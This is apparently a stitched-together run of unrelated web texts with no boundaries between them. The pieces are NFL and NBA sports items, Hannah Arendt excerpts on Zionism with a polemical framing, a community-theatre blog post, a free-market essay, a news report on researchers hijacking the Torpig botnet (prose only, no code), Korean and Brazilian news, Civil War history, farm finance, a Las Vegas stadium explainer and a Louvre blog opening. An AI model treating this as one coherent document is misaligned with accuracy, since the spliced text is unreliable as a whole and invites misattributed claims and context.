"He's moved himself up. He's had a really good camp," coach Gary Kubiak said, per the team's official website. "... He deserves more reps and if he keeps playing like that, he'll continue to get some more."
As we noted after the Broncos' second preseason contest, it will be difficult for Kubiak to run a bell-cow system with Hillman flashing.
Hillman has showed elusiveness and speed, a perfect match in Kubiak's wide zone running scheme. It isn't as though his 7.5 average this preseason was buoyed by an 80-yard run. He has popped off longs of 23 and 15 yards, meaning he's averaging 5.8 yards per carry on all other runs.
"I feel like I fit in any kind of offense, but this one, it just fits my abilities a lot more than the other ones would," Hillman said.
"In this offense, they just want you to stretch and go downfield as fast as possible," he added. "I think that ties into when you're kind of fast, everybody thinks that you're going to go to the edge, and you just go right up the field."
The fourth-year-back's performance led long-time Broncos reporter Mike Klis to declare Hillman the "1B runner behind C.J. Anderson."
This is a long way of saying if you take Anderson high in your fantasy draft, don't be flabbergasted when he's sharing carries.
The latest Around The NFL Podcast discusses Jordy Nelson's knee injury and gives its winners and losers from Week 2 of the preseason.
For the new year, here are some prophetic excerpts from two essays of Hannah Arendt's, collected in The Jewish Writings (2007). Please note her predictions of the Nakba, of unending conflict, of Zionist dependence on the American Jewish community, of ultimate conflict with that American Jewish community, and the contribution of political Zionism to world anti-semitism. Just what Howard Gutman said recently. For which he was denounced by– Zionists.
Zionism Reconsidered, 1944:
Nationalism is bad enough when it trusts in nothing but the rude force of the nation. A nationalism that necessarily and admittedly depends upon the force of a foreign nation is certainly worse. This is the threatened state of Jewish nationalism and of the proposed Jewish state, surrounded inevitably by Arab states and Arab people. Even a Jewish majority in Palestine–nay even a transfer of all Palestine's Arabs, which is openly demanded by the revisionists–would not substantially change a situation in which Jews must either ask protection from an outside power against their neighbors or come to a working agreement with their neighbors…
[T]he Zionists, if they continue to ignore the Mediterranean people and watch out only for the big faraway powers, will appear only as their tools, the agents of foreign and hostile interests. Jews who know their own history should be aware that such a state of affairs will inevitably lead to a new wave of Jew-hatred; the antisemitism of tomorrow will assert that Jews not only profiteered from the presence of foreign big powers in that region but had actually plotted it and hence are guilty of the consequences…
[T]he sole new piece of historical philosophy which the Zionists contributed out of their own new experiences [was] “A nation is a group of people… held together by a common enemy” (Herzl)–an absurd doctrine…
To such [political] independence, it was believed, the Jewish nation could arrive under the protecting wings of any great power strong enough to shelter its growth…. the Zionists ended by making the Jewish national emancipation entirely dependent upon the material intersts of another nation.
The actual result was a return of the new movement to the traditional methods of shtadlonus [court Jews], which the Zionists once had so bitterly despised and violently denounced. Now Zionists too knew no better place politically than the lobbies of the powerful, and no sounder basis for agreements than their good services as agents of foreign interests…
[O]nly folly could dictate a policy which trusts a distant imperial power for protection, while alienating the goodwill of neighbors. What then, one is prompted to ask, will be the future policy of Zionism with respect to big powers, and what program will Zionists have to offer for a solution of the Arab-Jewish conflict?…
If a Jewish commonwealth is obtained in the near future–with or without partition–it will be due to the political influence of American Jews…. But if the Jewish commonwealth is proclaimed against the will of the Arabs and without the support of the Mediterranean peoples, not only financial help but political support will be necessary for a long time to come. And that may turn out to be very troublesome indeed for Jews in this country [the U.S.], who after all have no power to direct the political destinies of the Near East. It may eventually be far more of a responsibility than today they imagine or tomorrow can make good.
I suspect theatergoers have a love/hate relationship with Stephen Sondheim. I know I kind of do. Sometimes his work is sheer brilliance, spinning elegant insight out of ugly misanthropy. Other times, he is so self-indulgent it makes my eyelids hurt.
What follows is not a review. This is one of my “I have wonderful, talented, fantastic theatre friends and I am proud of the show they just did” blog entries.
In this case, I just got back from closing night of Farmington Players' production of Sondheim's Assassins. If you aren't familiar with the show, in essence it is a musical revue of sorts with a meta thematic narrative tying together the experiences and motivations of the most notorious presidential assassins in American history. Fun night at the theatre, eh?
Well, morbid as it may make me sound, it actually is. Michael Smith with the assistance of Margaret Gilkes does a fabulous job directing this spiky material with stellar musical support from Rachael Rose. Kristi Schwartz also adds the perfect light touch to some comic choreography.
The show is an allegorical treatise examining the underdogs in our society and the effect that perceived/real persecution, disparity, and frustration can have on the most fragile of psyches. Assassin offers prescient analysis of our Instagram-happy, “Real Housewives of … Wherever” world in which fame is its own reward, regardless of the ugly costs. Sondheim also anticipates our ongoing collective debate about gun culture, asserting quite plainly that firearms and their immediate availability are a uniquely horrifying American tradition.
The cast, as I've indicated, is populated by some of my favorite theatre friends. Barbara Bruno (who deserves an extra shout-out for wringing every bit of comic gold from her role as “Sarah Jane Moore”), Bob Cox, Daniel Crosby, Barry Cutler, David Galido, Keith Janoch, Nick Rapson, Michael Soave, Alex Spittle, Keith Firstenberg, and Jason Wilhoite all do spectacular work in the principal roles, nailing the rich content of not only the score but the incisively written monologues. The ensemble (Erik Elwell, Jayne Firstenberg, Jim Moll, Martin Rinke, Pat Rodgers, and Patrick Wehner) all have the tough task of setting the atmosphere of any given historic era, and they accomplish it with aplomb.
This is not an easy show and it can quickly slide into creepy, clammy, artsy-fartsy territory without a strong cast and directorial vision, but this production deftly avoids that trap. Like another Sondheim classic Company, Assassins revels in its lack of any discernible plot and in playing mind-bending, dream-like tricks with time and place.
The Farmington Players' production grounds the material with heart and humor, beautiful singing, sharp sound and lighting design, atmospherically minimal set pieces, and great character work. I'm sorry to say this is closing night and if you didn't get to see it, you missed out on a wonderful production.
As the main characters espouse in what is arguably the best song from the score, “everybody has the right to be happy.” And I certainly was tonight.

He is not the only one looking for brilliance in politicians. Others have found it in Ted Cruz, who is said to be “off the charts brilliant.”
Why seek brilliance in politicians? There seems to be a widespread belief that America will be well again if a politician with the right plan and the intelligence to carry it out obtains public office.
What if that belief is false?
Just How Brilliant Can Any of Us Be?
FEE founder Leonard Read in his book Deeper Than You Think noted that, despite our intelligence, each of us can know very little: “No person, regardless of his pretensions, glimpses more than an infinitesimal fragment of the Truth.… No person is any more than an intellectual mite, a spiritual speck in the Cosmic Scheme.”
“Intellectual mites” can't solve the fundamental economic problem of society. In his classic essay “The Use of Knowledge in Society,” Nobel laureate F.A. Hayek explains why. First, he points out the unimaginable powers we would need to centrally plan our economy:
If we possess all the relevant information, if we can start out from a given system of preferences, and if we command complete knowledge of available means, the problem which remains are purely one of logic.
"No person glimpses more than an infinitesimal fragment of the Truth." — Leonard Read
Of course, none of those ifs is possible. Hayek continues:
The knowledge of the circumstances of which we must make use never exists in concentrated or integrated form but solely as the dispersed bits of incomplete and frequently contradictory knowledge which all the separate individuals possess. The economic problem of society is thus … a problem of the utilization of knowledge which is not given to anyone in its totality.
When we understand Hayek, we understand that politicians who think they can plan don't even know how ignorant they really are. Read explains:
The political officeholder who recently intimated that he and his bureaucratic staff now had the will and the power to maintain an ever-expanding economy may be less a speck than you or me, for he doesn't even know how little he knows.
Why would politicians lack humility? Read described a human tendency that makes it hard for any of us to be humble:
How difficult it is to appreciate the littleness of our private wisdom, awareness, perception, consciousness! The tendency is to compare one's self with one's fellows which, more often than not, leads to the conclusion, “What a bright boy am I!”
The bright boys and girls who hold political office know little about the accuracy of their decisions and judgments. Nobel laureate behavioral economist and psychologist Daniel Kahneman warns: “Overconfident professionals sincerely believe they have expertise, act as experts and look like experts. You will have to struggle to remind yourself that they may be in the grip of an illusion.”
Do we enable politicians when we fall for their confident air and proclaim their brilliance? After all, we expect candidates to produce answers for problems in one-minute sound bites. When they don't, we call them indecisive and conclude that they lack solutions.
The Market Has Wisdom That Individuals Lack
In his book The Wisdom of Crowds, journalist James Surowiecki explains that intelligence is not fungible: “there's no real evidence that one can become expert in something as broad as ‘decision making' or ‘policy.'”
Surowiecki has counterintuitive conclusions for those who believe in decision making by elite experts:
If you can assemble a diverse group of people who possess varying degrees of knowledge and insight, you're better off entrusting it with major decisions rather than leaving them in the hands of one or two people, no matter how smart these people are.
The diversity we need to make better decisions is inherent in markets. As Surowiecki observes, markets are “made up of people with different attitudes towards risk, different time horizons, different investing styles and different information.”
Similarly, economist William Easterly instructs us in his new book, The Tyranny of Experts, that markets, not brilliant politicians, are “the most successful problem-solving system in human history.”
The truth is, each of us knows very little. As individuals, we are fallible decisionmakers. We don't know where solutions will emerge, or as Easterly puts it, “what will be the solution,” or “who will have the solution.”
Substituting the brilliance of the individual mind for the wisdom of the market leads to disaster.
Humility toward mighty “impersonal forces,” far greater than any human mind, is what is called for. Substituting the brilliance of the individual mind for the wisdom of the market leads to disaster. So, what role does that leave for brilliant politicians?
Do Brilliant Politicians Diminish Us and Prevent Solutions?
In her book Multipliers: How the Best Leaders Make Everyone Smarter, leadership consultant Liz Wiseman distinguishes between two types of organizational leaders: those who are able to tap into dispersed organizational knowledge and those who diminish organizational knowledge. Diminishers, she observes, are at their core “intellectual supremacists.” Wiseman writes,
The Diminisher's view of intelligence is based on elitism and scarcity. Diminishers appear to believe that really intelligent people are a rare breed and I am one of the few really smart people. They then conclude, other people will never figure things out without me.
Some leaders, Wiseman writes, “seem to drain intelligence and capability out of the people around them.” Do brilliant politicians drain the “intelligence and capability” out of the whole economy?
What if what ails us is not the absence of a brilliant political leader? What if what ails us is not too many problems and too few dollars to solve them? What if our real problem is that human ingenuity is being blocked by those who lack the humility to see that their real job is to steward property rights and the rule of law and then get out of the way?
Q: The offseason goal has to be to find a backup point guard? -- Frank.
Q: Given a choice, I'd rather have James Johnson play point, then Tyler Johnson. Tyler Johnson is more effective at the wing. -- Stuart.
A: First start with the obvious: The Heat do not have a backup point guard. Tyler Johnson is not a point guard, lacking the ballhandling skills under pressure. Josh Richardson, is not point guard, not when it comes to finding those scant openings for passes against NBA-level defense. But then consider the rest of the equation: With this roster, the Heat don't need a delineated backup point guard, not with the ability of James Johnson and Dion Waiters to handle. And Erik Spoelstra did a good job of that Sunday in Indiana, at times having as many as three ballhandlers on the court during the minutes Tyler Johnson and Josh Richardson played. And remember, this roster also was built around the ballhandling of Justise Winslow and Josh McRoberts. While I had been the one for years who cited the need for a third-string point guard, I have no issue with the current mix, with Waiters more of a playmaker than I envisioned, and with James Johnson practically demanding the ball in his hands.
Q: Why is Erik Spoelstra still so reluctant to run the offense through Hassan Whiteside? Hassan was amazing against the Pacers, and with our offense struggling, he deserved more touches. I understand Coach wants to shoot a lot of threes, but each game is different and you need to go with what is working. -- Danny, Miami.
A: No, Spoelstra actually made a point after the loss in Indiana of the Heat being too perimeter based against the Pacers. And this is another factor of the debate regarding the first two questions above: True point guards innately know how to get the ball where it needs to go. That isn't necessarily the case with players such as Tyler Johnson, Josh Richardson, James Johnson and Dion Waiters. Look, if Goran isn't available, the Heat aren't going anywhere in the playoff race, anyway. But I do believe, even while he had 21 shots Sunday, more could have been done with Whiteside if the Heat had the players to get him the ball in the right spots. Hassan shot 11 of 21 against the Pacers. The rest of the Heat shot 28 of 73.
Q: Hi, Ira. With all these teams bunched up together and not many games left, the tiebreaker may come into play. Could you update us on whom the Heat have tiebreakers against? -- Phillip, Cooper City.
A: Sure, the Heat lost the season tiebreaker 1-2 to the Bulls, won the tiebreakers 2-1 against the Pacers and 3-1 against the Bucks, finished 2-2 against the Hawks and are 1-2 against the Pistons with one game left in that series. The next tiebreaker would be conference record against the Pistons, if it comes to that, with the Pistons 20-20 in the East and the Heat 21-21 (in other words, that remaining game against the Pistons, on March 28 at the Palace of Auburn Hills, could be huge).

The unpleasant news broke on Saturday night, that WBO super bantamweight world champion Jessie Magdaleno (25-0, 18 KOs) will no longer be featured next month on ESPN.
The boxer suffered a hand injury in training camp, and that has forced him to withdraw from a scheduled mandatory title defense against Cesar Juarez (20-5, 15 KOs) of Mexico.
The fight was going to take place as part of an ESPN televised tripleheader on November 11 in Fresno, California.
The event will still move forward with the two remaining bouts. There is no word is a third will be added.
The main event, at the 16,000-seat Save Mart Center, will feature a battle of undefeated junior welterweight contenders, with hometown hero Jose Ramirez (20-0, 15 KOs) taking on Mike Reed (23-0, 12 KOs). There is also a high stakes light heavyweight showdown for the vacant International Boxing Federation championship - when Artur Beterbiev (11-0, 11 KOs)collides with Enrico Koelling (23-1, 6 KOs) in the co-main event.
The news of Magdanelo's injury did not sit very well with Juarez, who received a phone call over the weekend - advising him that Magdaleno suffered a wrist injury.
"From the moment I had my fight with Filipino Albert Pagara (Caesar knocked him out in July 2016), I received the number one ranking in the world inside the WBO. It is well known that Jessie Magdaleno stay away from facing me in a championship fight. It seems outrageous to me that at this point, and only a few weeks before the fight, that the champion has been injured, which is very dubious and as a result he avoids the fight that was also his mandatory - and he's also dared to disobey the rules of the WBO," Juarez said.
"Magdaleno is said to be world champion and he avoids strong boxers like me. My question is, does Jessie Magdaleno really deserve to have the world championship, when he's been changing dates and now canceling the fight? It seems to me that he has a lack of respect towards the World Boxing Organization, towards my work and that of my team, that for three months we have been working hard for this fight."
"If he does not have the capacity, veracity and heart to defend and be a champion, then let him vacate, because I am so hungry to be world champion; as well as showing it by giving high-quality matches and proving why I am the number one in the WBO world."
"I am in boxing because I want to be world champion, it would be easy to ask for compensation for his shortcomings, but that is not a remedy for the rudeness and lack of professionalism of Magdaleno. What I want is to fight with him and fulfill my dream."
Juárez indicated that his representative, Sean Gibbons, told him about the possibility of fight forWBO's interim title. Gibbons spoke with FranciscoValcárcel, president of the WBO. His opponent would be Filipino contender Marlon Tapales (30-2, 13 KO's).
"We do not exclude the possibility of competing for the interim world championship in November," Juarez said.

Researchers at the University of California Santa Barbara have published a paper (PDF) detailing their findings after hijacking a botnet for ten days earlier this year. Among other things, the researchers were able to collect 70GB of data that the bots stole from users, including 56,000 passwords gathered within a single hour. The information not only gave them a look at the inner workings of the botnet, they also got to see how secure users really are when it comes to online activities. (Hint: they aren't.)
The botnet in question is controlled by Torpig (also known as Sinowal), a malware program that aims to gather personal and financial information from Windows users. The researchers gained control of the Torpig botnet by exploiting a weakness in the way the bots try to locate their commands and control servers—the bots would generate a list of domains that they planned to contact next, but not all of those domains were registered yet. The researchers then registered the domains that the bots would resolve, and then set up servers where the bots could connect to find their commands. This method lasted for a full ten days before the botnet's controllers updated the system and cut the observation short.
During that time, however, UCSB's researchers were able to gather massive amounts of information on how the botnet functions as well as what kind of information it's gathering. Almost 300,000 unique login credentials were gathered over the time the researchers controlled the botnet, including 56,000 passwords gathered in a single hour using "simple replacement rules" and a password cracker. They found that 28 percent of victims reused their credentials for accessing 368,501 websites, making it an easy task for scammers to gather further personal information. The researchers noted that they were able to read through hundreds of e-mail, forum, and chat messages gathered by Torpig that "often contain detailed (and private) descriptions of the lives of their authors."
(Comically, the report notes that 0.1 percent of Torpig victims love "exchanging insults" online, with another four percent spending their time looking for sex online. The rest are doing relatively mundane things like worrying about grades, looking for advice from doctors and lawyers, looking for jobs, and playing video games.)
Of course, the primary goal of Torpig is to steal financial information like credit card numbers and bank logins. In just ten days, Torpig apparently obtained credentials of 8,310 accounts at 410 financial institutions, including PayPal, Capital One, E*Trade, and Chase. The researchers noted, too, that nearly 40 percent of the credentials stolen by Torpig were from browser password managers, and not actual login sessions, and that the Torpig controllers may have exploited these credentials for between $83,000 and $8.3 million during that time period.
Interestingly, a large number of the financial institutions that had been breached required "monumental effort" in order to notify the victims, according to the report. In fact, financial institutions weren't the only ones—interacting with registrars, hosting facilities, and law enforcement were all "rather complicated," indicating that there's a long way to go in order to make notifying botnet victims easier.
Not becoming a victim in the first place is the most ideal situation, however. The researchers concluded that victims of botnets are usually those with poorly maintained machines and who choose "easily guessable" passwords. " This is evidence that the malware problem is fundamentally a cultural problem," reads the report. "Even though people are educated and understand well concepts such as the physical security and the necessary maintenance of a car, they do not understand the consequences of irresponsible behavior when using a computer."
SEOUL, South Korea — President Park Geun-hye ordered the South Korean military and police on Monday to increase vigilance, especially along the disputed western sea border with North Korea. She warned that the North might attempt armed provocations after the recent purge and execution of Jang Song-thaek, who was believed to have been the North's second most powerful official.
“Given the recent series of incidents in North Korea, there is uncertainty over the direction in which the political situation there will develop,” Ms. Park's office quoted her as saying during a meeting with senior aides. “We cannot rule out contingencies like reckless provocations from the North.”
Ms. Park's warning about what she called “the gravity and unpredictability of the current situation” came as officials and analysts in the region were scrambling to determine what Mr. Jang's execution might mean for the stability, internal politics and foreign policy of North Korea, an opaque, nuclear-armed nation with an inexperienced leader, Kim Jong-un, who is believed to be 30 years old.
Mr. Jang, who was Mr. Kim's uncle and had been regarded as a mentor, was executed on Thursday after being accused of plotting to overthrow the government. His downfall was startling not only because of who he was, but also because of the unusually public way in which he was purged.
For me, this is a new one:
Have you ever seen this? Texas Lutheran's Tyler Hopkins has FG blocked only to kick again off bounce for 18-yard FG! #sctop10 #D3fb pic.twitter.com/bqWI2pfLWn — TLU Bulldogs (@tluathletics) September 17, 2017
Division III Texas Lutheran tried a field goal. If that school rings a bell it's because it's Verne Lundquist's alma mater. Uncle Verne's actually on the board of regents there.
The kick got blocked, but the kicker stuck with the play. As the ball bounced back to him, he kicked it again — all on the same play — and put it through the uprights. This, apparently, counted as a legal field goal.
It got booked like this:
Is re-kicking a blocked kick actually legal?
It's probably not legal, although not explicitly illegal according to the rulebook.
The NCAA's football rulebook says “a player shall not kick a loose ball,” and doing so is a 10-yard penalty that carries a loss of down.
Is this loose ball, then? I think it is:
A loose ball is a live ball not in player possession during: 1. A running play. 2. A scrimmage or free kick before possession is gained or regained or the ball is dead by rule.
(h/t @jpohara on Twitter)
We saw what that looks like last week when Mississippi State and Louisiana Tech bungled an 87-yard fumble. It included multiple kicks and we compared it to soccer.
That is a seriously deft first touch with his foot, folks. Ignore the fact that he's trying to grab the ball to no avail. Picture him 1 vs. 1 with a defenseless goalkeeper in front of him. His second kick gives him serious space to create separation, and if he hadn't stumbled I would have loved to see his clinical finish on goal. Oh, yeah, right. We're playing American football here still. Sorry.
The kicking team's allowed to pick up a blocked field goal and “advance” it, which is different from double-kicking it.
From the rulebook:
A scrimmage kick that fails to cross the neutral zone continues in play. All players may catch or recover the ball behind the neutral zone and advance it. The blocking of a scrimmage kick by an opponent of the kicking team who is not more than three yards beyond the neutral zone is considered to have occurred within or behind that zone.
That means blocked field goals are recoverable by the kicking team and can be run forward, for sure. We saw that recently in another DIII game, where an offensive lineman caught a blocked PAT and rumbled ahead for a two-point conversion:
I'm devastated that this act of special teams wizardry isn't strictly within the bounds of the rulebook.
Tombstone for Thomas Jonathan "Stonewall" Jackson's left arm
Here Stonewall's medical director, 27-year-old Dr. Hunter H. McGuire, deftly removed the ball from his hand and then rapidly amputated Jackson's arm about two inches below the shoulder.
Upon learning of Jackson's fate the next morning, General Robert E. Lee lamented, "He has lost his left arm, but I have lost my right." During the day Jackson's arm was respectfully buried about half a mile from the field hospital in the family burial plot of the Lacy family at Ellwood.
This secluded cemetery contained the remains of more than a score of deceased members of the Lacy clan, some of whom had been buried early in the 19th Century. As was customary in many such Virginia graveyards, none of the interred was identified by a marker of any description. Today the only monument is the one placed by Jackson's friends in 1903 to honor the memory of his arm. The memorial bears a simple inscription:
ARM OF
STONEWALL JACKSON
MAY 3, 1863
When Jackson died May 10, 1863, a week after the Battle of Chancellorsville, his body, in accordance with his wishes, was buried 100 miles away in Lexington, Virginia, where he had taught before the war at the Virginia Military Institute.

During the past several weeks, this column has focused on USDA's recent financial statistics with special emphasis upon key factors that have changed over the past several years. For example, farm gate receipts – for both crops and livestock - have declined markedly from recent peaks. That's inherently led to declining levels of working capital across all agriculture.
Meanwhile, one additional indicator of the ag sector's financial direction comes from USDA's estimates for return on assets. USDA calculates two separate measures:
Rate of return (ROA) on farm assets from income. USDA explains that ROA from income “measures the returns to farm sector assets from current farm operations.” Rate of return on farm assets from capital gains. The second component of overall ROA assesses “returns to the assets from an increase in the assets' value, apart from their income generating potential.”
This week's graph depicts agriculture's ROA trends during the current decade. Based upon previous discussion, the trends are not surprising. Total ROA peaked in 2012 at nearly 16% - much of that driven by improved returns from capital gains. That is, improving land values boosted that trend; that has since reversed sharply during the past several years.
Meanwhile, ROA from income has waned slightly since its 2011 peak (3.69%) but is forecast to remain positive through 2016. In combination, aggregate ROA has turned negative for 2016.
Similar to last week's discussion around working capital, which has declined nearly 50% in just three years, the trend is somewhat concerning. And if continued, will clearly have implications for farmers and ranchers in the coming years.
How do your returns compare to these national averages? What are doing to manage the trends discussed during the past several weeks? What financial expectations are you forecasting to manage around some of the broader macro-trends in agriculture – especially in the face of rising interest rates? Leave your thoughts in the comments section below.
Protests and strikes gripped several World Cup host cities Thursday as unrest spread less than a month before the soccer tournament begins.
About 1,000 people gathered for a World Cup demonstration in central Rio, playing musical instruments and holding up afternoon rush-hour traffic as hundreds of riot police stood by. By early evening, the number of protesters had more than doubled as striking teachers and university administration workers joined in.
“We are against the cup for the spending and for forgetting health and education,” said striking teacher Eduardo Douglas.
A 48-hour bus strike in the city — the second in a week — ended Wednesday night, but a strike by security guards entered its 21st day.
“The World Cup here in Brazil is the worst thing in the world for workers,” said Umberto Rocha, a director of a union for Rio security guards, speaking at a meeting. “They are investing in stadiums and forgetting the people.”

A similar demonstration in São Paulo, Brazil's biggest city, ended in violence after conflict broke out between protesters and police, who used tear gas. A crowd of 2,000 also protested against the World Cup in the center of Belo Horizonte, local media reported.
In the northeastern city of Recife, Brazilian television showed dramatic scenes of crowds looting appliance stores a day after street police went on strike to demand higher wages.
Brazilian news media reported seven killings in seven hours in Recife on Wednesday night, and soldiers began appearing on the streets Thursday afternoon.
Karla de Sá, 27, who lives in the city, said her 3-year-old son's school asked her to pick him up early because gunfights had broken out in a nearby slum.
“They never have gunfights there,” she said, speaking by phone. “The city is different. There are rumors of assaults, of robberies, looting shops, looting trucks. People put photos on Facebook. . . . Everybody wants to stay home.”
In São Paulo, at least eight protests took place across the city Thursday morning. Brazilian television said 2,000 protesters from a movement of homeless workers left their huge squatter camp to demonstrate outside the stadium where the opening World Cup game will be played June 12.
Riot police stood by as the protesters set piles of tires aflame, sending plumes of black smoke over the area.
Earlier, Maria Cequeira, one of the movement's organizers, told the Globo TV network that its members wanted the land turned over to cheap housing.
The organization, which last week briefly occupied foyers of three construction companies involved in World Cup projects, promised more protests in the countdown to the tournament.
Protesters in other parts of São Paulo closed three highways during the morning rush hour. Striking metalworkers closed two other roads.
In Belo Horizonte, in the state of Minas Gerais, city hall workers continued a strike, and in Brasilia, the federal capital, protesters linked to the homeless-workers movement in São Paulo invaded a government building, said the G1 news site. The site also reported that 2,000 teachers in Rio state voted to continue their strike.
Las Vegas Sands owner and Republican mega-donor Sheldon Adelson is proposing to build a nearly $2 billion domed stadium for an NFL team along the southern end of the Las Vegas Strip — and he is asking for public funding of $750 million in increased room taxes to help pay for it.
Developers are hoping to quickly send a deal sent to Gov. Brian Sandoval, whom they hope will call a special session of the state Legislature to approve the deal before the Nov. 8 election.
But negotiations are ongoing, with an advisory committee made up of major casino companies and a handful of public officials meeting weekly and questioning the developers on everything from infrastructure costs, funding and where the stadium would be built.
There are multiple issues at play, and with $750 million in public funds potentially on the line (which would be roughly 10 percent of the state's two-year spending plan), the stakes are high.
Here's what you should know about the stadium deal.
How we got here
The stadium's fate rests largely with the the Southern Nevada Tourism Infrastructure Committee, an advisory body made up of casino executives, local office-holders and state economic development offers that was initially formed to review and recommend infrastructure improvements in Las Vegas.
That changed in April, when the Sands, Raiders owner Mark Davis and soccer star David Beckham pitched the stadium proposal to the committee, promising to move the NFL franchise to Las Vegas if they could ensure a significant enough public contribution.
Many details have changed since the initial presentation, including moving the proposed site after Southwest Airlines raised concerns, as well as the total cost of the publicly-owned stadium creeping up to $1.9 billion.
At this point, the developers say they have three "non-negotiable" provisions: no less than $750 million in public funding, no public profit-sharing from stadium proceeds, and no hard dollar cap on the developer's preferred rate of return.
Public financing breakdown
Developers want to build a partially publicly-funded $1.9 billion stadium on one of two plots of land near the southern end of the Las Vegas Strip.
Stadium backers — led by Adelson and dozens of lobbyists and Sands executives — have proposed a public-private partnership with a public contribution of $750 million from a small increase in county hotel room taxes.
The current plan calls for a 0.88 percent hotel room tax increase along the Strip, and a half percent increase to the room tax elsewhere in the 25 miles surrounding the proposed stadium. (That would cover most Las Vegas but not the entire county.) Sands lobbyists have billed the proposed increase as a "tourist tax," which Nevada residents mostly wouldn't have to pay.
An increase would mark a modest jump to the closely-guarded county room tax, which varies from around 13 percent for Strip properties to 10 percent at the lowest. The largest chunks of tax revenue are directed toward K-12 education (38.7 percent) and the Las Vegas Convention and Visitors Authority (32.1 percent), a private-public agency focused on tourism and managing a 3.2 million square-foot convention center.
So how would the public funding aspect actually work? Draft legislation reviewed by the committee (which is still subject to change) gives a few hints, including requiring the Clark County Commission to issue $750 million worth of municipal bonds to cover the initial construction costs.
Developers say the proposed 0.88 percent room tax increase will bring in roughly $50 million per year, but if projected revenue fell short of that figure, the responsibility of making bond payments lies with the county commission and the public — not the Adelsons or the Raiders.
Stadium backers point out that the proposed 0.88 percent room tax increase is large enough to cover 1.5 times what it would take to repay the flat $750 million operating cost, which they say guards against a future recession.
Developers say all bond-funded projects — schools, road construction, etc. — would be at risk if room tax revenue were to fall at a rate that required the county to somehow make up the deficit or declare the bonds defaulted.
If all proposed hotel taxes increases are approved, Vegas's room tax rate could increase from 12.9 percent to 14.28 percent.
That's about on par with the rate in New York City (14.75 percent) and behind Chicago (17.4 percent), San Francisco (16.64 percent) and Houston (17 percent).
Where the rest of the funding comes from
The Raiders themselves plan to chip in a total of $500 million towards the stadium, including an estimated $110 million from the selling of personal seats, a $200 million loan from the NFL and $100 million from the team itself, including proceeds from stadium naming rights.
Adelson, who Forbes estimates is worth $30 billion, says he would put $650 million of his own money to fund the remaining cost, as well as cover any overruns.
The advisory committee and the developers are still tangling over who holds responsibility for potential infrastructure costs like expanded roads and other upgrades to avoid snarling traffic on game days. The current plan allocates $375 million to land acquisition and on-site improvements like parking lots and developers say they'll fund infrastructure costs past that amount as long as it isn't "cost-prohibitive."
Economic impact?
Developers are promising that a stadium will deliver a massive economic boon, including the equivalent of 8,000 full-time jobs and hundreds of millions of dollars in economic impact.
This analysis is based on a report authored primarily by University of Michigan professor Mark Rosentraub on the potential benefits of a new domed stadium to Las Vegas.
Despite rosy claims, the vast majority of economic studies indicate that publicly-subsidized stadiums have a small to negligible economic impact and rarely result in large economic spillover gains.
A 2011 Holy Cross University study delved into some of the common pitfalls around economic impact promises, and found that the methodology used in many such studies is "fatally flawed" and biased toward unrealistic economic impacts.
Study authors concluded that measuring the efficiency of public stadium subsidies as a tool to spur economic development is the most important factor to consider.
"The litmus test arguably should not be whether sport induces an increase in economic activity, but rather is it the most efficient method for improving the economy," they wrote.
The Rosentraub/UNLV study does try to control for substitution effects and other pitfalls that befall similar stadium studies, and "conservatively" estimates the number of large-scale events a new stadium would attract.
Regardless of economic impacts, the total dollar amount of the subsidy would be at the "front of the pack" compared to other new stadium deals.
Opposition
Members of the advisory committee haven't rubber-stamped the proposal; several members continue to pepper the developers with questions and concerns about the deal.
Clark County Commissioner Chris Giunchigliani is a vocal opponent. She submitted written opposition to the stadium in a letter sent to advisory committee chairman Steve Hill.
"Room taxes are public and if someone wishes to build a stadium they should use their private dollars to build it — no public taxes should be utilized in any format," she wrote.
The stadium also faces an opponent in Culinary Local 226, the state's largest union, which publicly came out against the deal. Other unions, like the local buildings and trades council, support the proposal.
Other progressive groups are taking a much more active stance opposing the stadium, with several launching the website stadiumscam.com and directly lobbying lawmakers.
Election issues
Any tax increase — whether for a new stadium or convention center expansion — requires approval of two-thirds of the state's part-time Legislature, which would have to be called into special session by Sandoval to approve any deal before the Legislature goes back into session in February 2017.
Developers face a tight deadline between the upcoming November election and the NFL's owners meeting in January 2017 and are calling for a special session to start in mid-September.
But there are political concerns. Nevada law prohibits legislators from soliciting or accepting any campaign contributions immediately after a special session is called and for a 15-day period afterwards, blocking out a crucial fundraising time for many legislators.
Sandoval faces a tough political puzzle in blocking out weeks of fundraising while trying to hold Republican majorities in the state Assembly and Senate, especially after shepherding a record-breaking tax increase to help pay for K-12 education funding in 2015.
The Republican governor has consistently said that he won't make any decision on calling a special session until the committee submits its recommendations.
Legislators including state Senate Majority Leader Michael Roberson — prominently featured in a May promotional video for the stadium — said the "political reality" is that a stadium deal would need to be tied to expanding the publicly-backed Las Vegas Convention Center.
Adelson is a prolific state level political donor, with the billionaire and his companies directly donating at least $200,000 to legislative candidates before the state's 2016 primary election. He's also been a prolific donor to Sandoval, giving more than $336,900 directly to the candidate and his associated political action committees.
An article in the Las Vegas Sun detailed the lobbying efforts being undertaken by stadium developers, including calling some lawmakers several times a day. Only a handful of Democratic lawmakers have spoken out against the deal.
Legislative hurdles
If a two-thirds vote seems unattainable, the state Legislature does have the option to pass the actual decision-making process off to the seven-member Clark County Commission.
Nevada's constitution requires a two-thirds vote for any tax increase, which can be a tough sell given the large number of Republican legislators who sign no-tax pledges and Democrats wary of publicly funding a stadium. But a work-around exists — only a simple majority of lawmakers are needed to approve enabling taxing legislation, which essentially punts the actual tax decision to a local government.
A similar situation played out in 2013, where the state Legislature approved a law enabling the Washoe County (Reno) Commission to raise sales taxes to fund school construction. Commissioners ultimately declined to vote on the issue.
Stadium developers say they're prepared for "either contingency," and said they believe they have support of the necessary two-thirds of legislators.
NFL approval
Even if a stadium deal is approved on the state side, the Raiders still need to gain the approval of three-fourths of team owners to actually relocate to another city.
Current NFL policy requires teams submit relocation bids to the League by Feb. 15 of the year the move is scheduled to occur.
Dallas Cowboys owner Jerry Jones and Patriots owner Robert Kraft have expressed interest in Las Vegas as a possible NFL venue.
A vote to move the team would likely come in January during the league's team owners meeting, but the Sands says earlier state approval of a stadium is needed in order to garner support from other league owners.
If a stadium deal is approved and the Raiders back out, the current draft legislation calls for creation of a smaller stadium to be built to house the UNLV football team.
In continuing our series The Art of Paris, one must include the Louvre. With this impressive and giant museum, the only way I could think of tackling a blog article about it was to create a top 5 must see list. You could spend months inside the museum and still not view every object. So when you go, it is helpful if you do a little research, figure out what you want to see, it's location, and everything in between is a bonus.
